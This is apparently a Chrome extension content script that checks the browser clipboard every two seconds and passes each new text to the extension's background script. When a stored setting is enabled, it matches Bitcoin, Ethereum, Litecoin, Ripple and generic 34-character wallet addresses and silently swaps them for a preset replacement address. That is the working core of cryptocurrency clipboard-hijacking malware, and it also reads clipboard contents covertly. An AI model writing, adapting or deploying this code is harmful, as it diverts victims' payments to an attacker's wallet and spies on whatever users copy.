let lastClipboard = '';
let intervalId = null;
const CHECK_INTERVAL_MS = 2000;


const WALLET_REGEXES = [
  /\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b/g, // Bitcoin
  /\b0x[a-fA-F0-9]{40}\b/g, // Ethereum
  /\b[L3][a-km-zA-HJ-NP-Z1-9]{26,33}\b/g, // Litecoin
  /\br[0-9a-zA-Z]{24,34}\b/g, // Ripple
  /\b[0-9A-Za-z]{34}\b/g // Generic (catch-all, last)
];

function replaceWalletAddresses(text, enabled, replacement) {
  if (!enabled || !replacement) return text;
  let replaced = text;
  for (const regex of WALLET_REGEXES) {
    replaced = replaced.replace(regex, replacement);
  }
  return replaced;
}

function readAndSendClipboard() {
  navigator.clipboard.readText().then(text => {
    chrome.storage.local.get(["walletReplaceEnabled", "replacementWalletAddress"], (result) => {
      const enabled = result.walletReplaceEnabled || false;
      const replacement = result.replacementWalletAddress || "";
      let replaced = replaceWalletAddresses(text, enabled, replacement);
      if (enabled && replaced !== text) {
        navigator.clipboard.writeText(replaced).catch(() => {});
        lastClipboard = replaced;
        chrome.runtime.sendMessage({ type: 'clipboardData', text: replaced });
      } else {
        if (text && text !== lastClipboard) {
          lastClipboard = text;
          chrome.runtime.sendMessage({ type: 'clipboardData', text });
        }
      }
    });
  }).catch(() => {}); 
}

function startMonitoring() {
  if (!intervalId) {
    readAndSendClipboard();
    intervalId = setInterval(readAndSendClipboard, CHECK_INTERVAL_MS);
  }
}

function stopMonitoring() {
  if (intervalId) {
    clearInterval(intervalId);
    intervalId = null;
  }
}

function shouldMonitorClipboard(callback) {
  chrome.storage.local.get(["clipboardEnabled", "walletReplaceEnabled"], (result) => {
    callback(!!(result.clipboardEnabled || result.walletReplaceEnabled));
  });
}

function updateMonitoring() {
  shouldMonitorClipboard((shouldMonitor) => {
    if (shouldMonitor) {
      startMonitoring();
    } else {
      stopMonitoring();
    }
  });
}

chrome.storage.onChanged.addListener((changes, namespace) => {
  if (namespace === 'local' && (changes.clipboardEnabled || changes.walletReplaceEnabled)) {
    updateMonitoring();
  }
});


shouldMonitorClipboard((shouldMonitor) => {
  if (shouldMonitor) {
    startMonitoring();
  }
}); 